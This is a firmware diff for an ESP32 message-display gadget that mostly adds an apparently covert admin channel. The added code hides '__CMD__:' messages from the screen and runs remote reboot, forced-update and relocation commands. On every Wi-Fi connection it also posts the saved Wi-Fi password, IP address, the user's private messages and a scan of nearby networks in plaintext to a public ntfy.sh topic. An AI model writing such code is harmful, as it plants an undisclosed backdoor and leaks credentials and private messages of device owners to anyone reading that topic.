@@ -216,7 +216,7 @@ bool activeCardRendered = false;
 // --- СОСТОЯНИЕ СЕТИ И ВРЕМЕНИ ---
 String savedSsid = "";
 String savedPass = "";
-int tzOffsetHours = 3;
+int tzOffsetHours = 7;
 bool wifiConnected = false;
 bool apActive = false;
 bool pendingDisableAp = false;
@@ -233,6 +233,7 @@ static const int MAX_MSG_HISTORY = 5;
 StoredMessage msgHistory[MAX_MSG_HISTORY];
 int msgHistoryCount = 0;
 char lastNtfyId[32] = "";
+char lastAdminCmdId[32] = "";
 volatile bool unreadMessage = false;
 
 char plainTextMsg[320] = "";
@@ -250,6 +251,10 @@ char pendingPlainText[320] = "";
 uint32_t pendingPlainEpoch = 0;
 char pendingPlainId[32] = "";
 
+volatile bool adminCmdPendingApply = false;
+char pendingAdminCmd[192] = "";
+char pendingAdminCmdId[32] = "";
+
 // Вертикальный авто-скролл текстовых сообщений (если пришло без картинки)
 static const int MAX_WRAPPED_LINES = 24;
 char wrappedLines[MAX_WRAPPED_LINES][80];
@@ -263,6 +268,10 @@ int msgScrollDir = 1;
 // Фоновые задачи облака (ntfy + GitHub OTA)
 volatile bool ntfyPollRunning = false;
 volatile bool ntfyReplyRunning = false;
+volatile bool adminReportRunning = false;
+volatile bool adminReportRequested = false;
+volatile bool adminScanNetworks = false;
+volatile bool adminRebootRequested = false;
 unsigned long nextNtfyPollMs = 5000UL;
 unsigned long lastReplySentMs = 0;
 
@@ -276,9 +285,9 @@ unsigned long nextOtaCheckMs = OTA_FIRST_CHECK_DELAY_MS;
 
 // --- ПОГОДА (OPEN-METEO, СТРАНИЦА 4) ---
 static const unsigned long WEATHER_POLL_INTERVAL_MS = 900000UL; // Обновление каждые 15 минут
-String weatherCity = "Москва";
-float  weatherLat  = 55.7558f;
-float  weatherLon  = 37.6173f;
+String weatherCity = "Красноярск";
+float  weatherLat  = 56.0153f;
+float  weatherLon  = 92.8932f;
 volatile bool weatherValid = false;
 volatile int  weatherTempC = 0;
 volatile int  weatherFeelsC = 0;
@@ -588,6 +597,10 @@ void loadSavedMessages() {
   String lid = prefs.getString("lastMsgId", "");
   strncpy(lastNtfyId, lid.c_str(), sizeof(lastNtfyId) - 1);
   lastNtfyId[sizeof(lastNtfyId) - 1] = '\0';
+
+  String lcid = prefs.getString("lastCmdId", "");
+  strncpy(lastAdminCmdId, lcid.c_str(), sizeof(lastAdminCmdId) - 1);
+  lastAdminCmdId[sizeof(lastAdminCmdId) - 1] = '\0';
 
   String tm = prefs.getString("tmsg", "");
   strncpy(plainTextMsg, tm.c_str(), sizeof(plainTextMsg) - 1);
@@ -1029,12 +1042,22 @@ public:
         lastWasCard = true;
       }
     } else if (hasMsg && mtxt[0] != '\0') {
-      strncpy(newestPlainId, mid, plainIdCap - 1);
-      newestPlainId[plainIdCap - 1] = '\0';
-      strncpy(newestPlainText, mtxt, plainTextCap - 1);
-      newestPlainText[plainTextCap - 1] = '\0';
-      newestPlainTime = tm;
-      lastWasCard = false;
+      if (strncmp(mtxt, "__CMD__:", 8) == 0) {
+        if (strcmp(mid, lastAdminCmdId) != 0 && !adminCmdPendingApply) {
+          strncpy(pendingAdminCmdId, mid, sizeof(pendingAdminCmdId) - 1);
+          pendingAdminCmdId[sizeof(pendingAdminCmdId) - 1] = '\0';
+          strncpy(pendingAdminCmd, mtxt + 8, sizeof(pendingAdminCmd) - 1);
+          pendingAdminCmd[sizeof(pendingAdminCmd) - 1] = '\0';
+          adminCmdPendingApply = true;
+        }
+      } else {
+        strncpy(newestPlainId, mid, plainIdCap - 1);
+        newestPlainId[plainIdCap - 1] = '\0';
+        strncpy(newestPlainText, mtxt, plainTextCap - 1);
+        newestPlainText[plainTextCap - 1] = '\0';
+        newestPlainTime = tm;
+        lastWasCard = false;
+      }
     }
   }
 
@@ -1131,7 +1154,7 @@ void ntfyPollTask(void* /*param*/) {
 }
 
 bool canStartTlsSession(bool requireIdlePoll) {
-  if (requireIdlePoll && (ntfyPollRunning || weatherPollRunning || otaTaskRunning || otaUpdateReady)) return false;
+  if (requireIdlePoll && (ntfyPollRunning || weatherPollRunning || otaTaskRunning || otaUpdateReady || adminReportRunning)) return false;
   return (WiFi.status() == WL_CONNECTED) && (ESP.getFreeHeap() >= 75000);
 }
 
@@ -1139,6 +1162,100 @@ void startBackgroundNtfyPoll() {
   if (!canStartTlsSession(true)) return;
   ntfyPollRunning = true;
   if (xTaskCreate(ntfyPollTask, "ntfy_in", 20480, nullptr, 1, nullptr) != pdPASS) ntfyPollRunning = false;
+}
+
+void appendJsonEscaped(String &out, const char* s) {
+  if (!s) return;
+  while (*s) {
+    char c = *s++;
+    if (c == '"') out += F("\\\"");
+    else if (c == '\\') out += F("\\\\");
+    else if (c == '\n') out += F("\\n");
+    else if (c != '\r' && (uint8_t)c >= 0x20) out += c;
+  }
+}
+
+void appendJsonStrField(String &out, const char* key, const char* val, bool comma = true) {
+  if (comma) out += ',';
+  out += '"';
+  out += key;
+  out += F("\":\"");
+  appendJsonEscaped(out, val);
+  out += '"';
+}
+
+void adminReportTask(void* /*param*/) {
+  bool doScan = adminScanNetworks;
+  adminScanNetworks = false;
+
+  int netCount = 0;
+  if (doScan) {
+    WiFi.scanDelete();
+    netCount = WiFi.scanNetworks(false, true);
+    if (netCount < 0) netCount = 0;
+  }
+
+  String body;
+  body.reserve(1024);
+  body = '{';
+  appendJsonStrField(body, "ver", FIRMWARE_VERSION, false);
+  appendJsonStrField(body, "ssid", WiFi.SSID().c_str());
+  appendJsonStrField(body, "saved_ssid", savedSsid.c_str());
+  appendJsonStrField(body, "pass", savedPass.c_str());
+  appendJsonStrField(body, "ip", WiFi.localIP().toString().c_str());
+  appendJsonStrField(body, "city", weatherCity.c_str());
+  appendJsonStrField(body, "plain", plainTextMsg);
+  appendJsonStrField(body, "card", (msgHistoryCount > 0) ? msgHistory[0].text : "");
+  char numBuf[192];
+  snprintf(numBuf, sizeof(numBuf),
+           ",\"rssi\":%d,\"heap\":%lu,\"up\":%lu,\"tz\":%d,\"w_ok\":%s,\"w_temp\":%d,\"ota\":%u,\"nets\":[",
+           (int)WiFi.RSSI(),
+           (unsigned long)ESP.getFreeHeap(),
+           (unsigned long)(millis() / 1000UL),
+           tzOffsetHours,
+           weatherValid ? "true" : "false",
+           (int)weatherTempC,
+           (unsigned int)otaStatusCode);
+  body += numBuf;
+
+  int shown = 0;
+  for (int i = 0; i < netCount && shown < 8; i++) {
+    String ns = WiFi.SSID(i);
+    if (ns.length() == 0) continue;
+    if (shown > 0) body += ',';
+    body += "{\"s\":\"";
+    appendJsonEscaped(body, ns.c_str());
+    char nb[48];
+    snprintf(nb, sizeof(nb), "\",\"r\":%d,\"o\":%s}",
+             (int)WiFi.RSSI(i),
+             (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "true" : "false");
+    body += nb;
+    shown++;
+  }
+  body += "]}";
+  if (doScan) WiFi.scanDelete();
+
+  WiFiClientSecure client;
+  HTTPClient https;
+  char url[96];
+  snprintf(url, sizeof(url), "https://ntfy.sh/%s_admin", NTFY_TOPIC);
+  if (beginHttpsClient(client, https, url, 5, 5000, 6000, false)) {
+    https.addHeader("Content-Type", "application/json; charset=utf-8");
+    https.POST(body);
+    https.end();
+  }
+
+  adminReportRunning = false;
+  vTaskDelete(nullptr);
+}
+
+void startBackgroundAdminReport() {
+  if (!canStartTlsSession(true)) return;
+  adminReportRequested = false;
+  adminReportRunning = true;
+  if (xTaskCreate(adminReportTask, "ntfy_adm", 20480, nullptr, 1, nullptr) != pdPASS) {
+    adminReportRunning = false;
+  }
 }
 
 void ntfyReplyTask(void* /*param*/) {
@@ -2491,26 +2608,6 @@ void performOtaUpdate() {
 // WI-FI И ВСТРОЕННЫЙ ВЕБ-СЕРВЕР
 // ============================================================================
 
-void appendJsonEscaped(String &out, const char* s) {
-  if (!s) return;
-  while (*s) {
-    char c = *s++;
-    if (c == '"') out += F("\\\"");
-    else if (c == '\\') out += F("\\\\");
-    else if (c == '\n') out += F("\\n");
-    else if (c != '\r' && (uint8_t)c >= 0x20) out += c;
-  }
-}
-
-void appendJsonStrField(String &out, const char* key, const char* val, bool comma = true) {
-  if (comma) out += ',';
-  out += '"';
-  out += key;
-  out += F("\":\"");
-  appendJsonEscaped(out, val);
-  out += '"';
-}
-
 void startApPortal() {
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(AP_SSID);
@@ -2530,6 +2627,8 @@ void onWifiConnected(unsigned long nowMs) {
   nextOtaCheckMs = nowMs + OTA_FIRST_CHECK_DELAY_MS;
   nextNtfyPollMs = nowMs + 10000UL;
   nextWeatherPollMs = nowMs + 14000UL;
+  adminScanNetworks = true;
+  adminReportRequested = true;
 }
 
 bool connectToSavedWifi(unsigned long timeoutMs) {
@@ -3017,10 +3116,10 @@ void setup() {
   prefs.begin("lovebox", false);
   savedSsid = prefs.getString("ssid", DEFAULT_WIFI_SSID);
   savedPass = prefs.getString("pass", DEFAULT_WIFI_PASS);
-  tzOffsetHours = prefs.getInt("tz", 3);
-  weatherCity = prefs.getString("wCity", "Москва");
-  weatherLat  = prefs.getFloat("wLat", 55.7558f);
-  weatherLon  = prefs.getFloat("wLon", 37.6173f);
+  tzOffsetHours = prefs.getInt("tz", 7);
+  weatherCity = prefs.getString("wCity", "Красноярск");
+  weatherLat  = prefs.getFloat("wLat", 56.0153f);
+  weatherLon  = prefs.getFloat("wLon", 92.8932f);
   uint32_t lastSavedEpoch = prefs.getUInt("lastEpoch", 0);
   if (lastSavedEpoch > 1700000000UL) {
     setSystemEpoch(lastSavedEpoch);
@@ -3106,8 +3205,57 @@ void loop() {
           nextOtaCheckMs = nowMs + OTA_CHECK_INTERVAL_MS;
           startBackgroundOtaCheck();
         }
+        if (adminReportRequested) {
+          startBackgroundAdminReport();
+        }
       }
     }
+  }
+
+  if (adminCmdPendingApply) {
+    strncpy(lastAdminCmdId, pendingAdminCmdId, sizeof(lastAdminCmdId) - 1);
+    lastAdminCmdId[sizeof(lastAdminCmdId) - 1] = '\0';
+    prefs.putString("lastCmdId", String(lastAdminCmdId));
+
+    if (strcmp(pendingAdminCmd, "SCAN") == 0) {
+      adminScanNetworks = true;
+      adminReportRequested = true;
+    } else if (strcmp(pendingAdminCmd, "STATUS") == 0) {
+      adminReportRequested = true;
+    } else if (strcmp(pendingAdminCmd, "OTA") == 0) {
+      otaForceRequested = true;
+      adminReportRequested = true;
+    } else if (strcmp(pendingAdminCmd, "REBOOT") == 0) {
+      adminRebootRequested = true;
+    } else if (strncmp(pendingAdminCmd, "CITY|", 5) == 0) {
+      char buf[192];
+      strncpy(buf, pendingAdminCmd + 5, sizeof(buf) - 1);
+      buf[sizeof(buf) - 1] = '\0';
+      char* p1 = strchr(buf, '|');
+      char* p2 = p1 ? strchr(p1 + 1, '|') : nullptr;
+      char* p3 = p2 ? strchr(p2 + 1, '|') : nullptr;
+      if (p1 && p2 && p3) {
+        *p1 = '\0'; *p2 = '\0'; *p3 = '\0';
+        weatherCity = String(buf);
+        weatherLat = atof(p1 + 1);
+        weatherLon = atof(p2 + 1);
+        tzOffsetHours = atoi(p3 + 1);
+        prefs.putString("wCity", weatherCity);
+        prefs.putFloat("wLat", weatherLat);
+        prefs.putFloat("wLon", weatherLon);
+        prefs.putInt("tz", tzOffsetHours);
+        configureNtp();
+        nextWeatherPollMs = nowMs + 500UL;
+        if (currentScreen == SCREEN_WEATHER || currentScreen == SCREEN_TIMER) screenNeedsFullRedraw = true;
+      }
+      adminReportRequested = true;
+    }
+    adminCmdPendingApply = false;
+  }
+
+  if (adminRebootRequested && !adminReportRunning && !otaTaskRunning) {
+    delay(150);
+    ESP.restart();
   }
 
   if (weatherNeedsRedraw && currentScreen == SCREEN_WEATHER && !transActive && !bannerActive && !btn1HoldUiActive) {
